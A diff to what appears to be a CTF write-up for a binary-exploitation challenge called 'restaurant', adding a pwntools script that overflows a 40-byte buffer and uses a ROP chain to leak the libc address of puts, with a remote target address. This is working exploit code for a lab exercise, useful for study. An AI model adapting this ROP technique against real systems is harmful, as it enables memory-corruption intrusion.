@@ -4,7 +4,66 @@
 ```
 
 ```python
-print_f = p.recv(6).ljust(8, b"\x00") print_f = u64(print_f) print(f"Leaked printf: {hex(print_f)}")
+print_f = p.recv(6).ljust(8, b"\x00")
+print_f = u64(print_f) 
+print(f"Leaked printf: {hex(print_f)}")
+```
+
+
+```python
+from pwn import *
+
+context.log_level = 'info'
+context.binary = "./restaurant"
+elf = context.binary
+
+def start():
+    if args.R:
+        return remote("154.57.164.82", 32310)
+    elif args.GDB:
+        return gdb.debug(elf.path, gdbscript='''
+            b *0x0000000000400e9d         
+            continue
+        ''')
+    else:
+        return process(elf.path)
+
+def exploit(io):
+    payload = b'A' * 40
+    payload += p64(0x00000000004010a3)  # pop rdi; ret
+    payload += p64(elf.got['puts'])
+    payload += p64(elf.plt['puts'])
+    payload += p64(elf.symbols['main'])
+    
+    io.recvuntil(b"> ")
+    io.sendline(b"1")
+    io.recvuntil(b"> ")
+    io.sendline(payload)
+    io.recvuntil(b"Enjoy your ")
+    io.recv(40)
+    raw_data = io.recvline()
+    
+    # Extract the leaked address
+    if b'\x7f' in raw_data:
+        idx = raw_data.index(b'\x7f')
+        leaked_bytes = raw_data[idx:idx+6]
+    else:
+        leaked_bytes = raw_data.strip()[:6]
+    
+    puts_libc = u64(leaked_bytes.ljust(8, b'\x00'))
+    
+    print("\n" + "="*40)
+    print(f"[+] Leaked puts@libc address: {hex(puts_libc)}")
+    print("="*40 + "\n")
+    
+    return puts_libc  # Return the leaked address
+
+if __name__ == '__main__':
+    io = start()
+    leaked_puts = exploit(io)
+    print(f"[+] Returned value: {hex(leaked_puts)}")
+    io.interactive()
+
 ```
 
 
